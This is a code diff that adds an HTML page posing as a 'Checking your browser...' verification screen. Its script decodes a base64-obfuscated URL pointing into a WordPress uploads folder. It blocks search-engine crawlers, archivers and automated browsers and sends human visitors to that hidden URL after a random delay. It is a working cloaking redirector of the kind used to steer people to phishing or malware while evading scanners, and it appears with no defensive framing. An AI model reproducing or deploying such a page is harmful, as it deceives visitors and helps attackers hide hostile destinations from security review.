@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Checking...</title>
+  <meta name="referrer" content="no-referrer">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #fff;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+      font-size: 16px;
+      user-select: none;
+    }
+    a#trap {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div>Checking your browser...</div>
+  <a href="https://google.com" id="trap">bot trap</a>
+
+  <script>
+    (function () {
+      // Base64-encoded redirect URL
+      const encodedURL = "aHR0cHM6Ly93d3cucm95dGhvbWFzLmNvbS93cC1jb250ZW50L3VwbG9hZHMvMjAyNS9zYWZl";
+
+      // Known bad bots
+      const bots = [
+        "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider",
+        "yandex", "sogou", "facebot", "ia_archiver"
+      ];
+
+      function isBot() {
+        const ua = navigator.userAgent.toLowerCase();
+        return bots.some(b => ua.includes(b)) || navigator.webdriver;
+      }
+
+      function isTrapTriggered() {
+        const trap = document.getElementById("trap");
+        return trap.matches(":hover") || document.activeElement === trap;
+      }
+
+      function decodeURL() {
+        try {
+          const url = atob(encodedURL);
+          return url.startsWith("http") ? url : null;
+        } catch (e) {
+          return null;
+        }
+      }
+
+      function go() {
+        if (isBot() || isTrapTriggered()) {
+          document.body.innerHTML = "<h3>Access Denied</h3>";
+          return;
+        }
+
+        const finalURL = decodeURL();
+        if (!finalURL) {
+          document.body.innerHTML = "<h3>Error loading</h3>";
+          return;
+        }
+
+        setTimeout(() => {
+          window.location.href = finalURL;
+        }, Math.floor(Math.random() * 500) + 200); // small delay (200–700ms)
+      }
+
+      window.onload = go;
+    })();
+  </script>
+</body>
+</html>
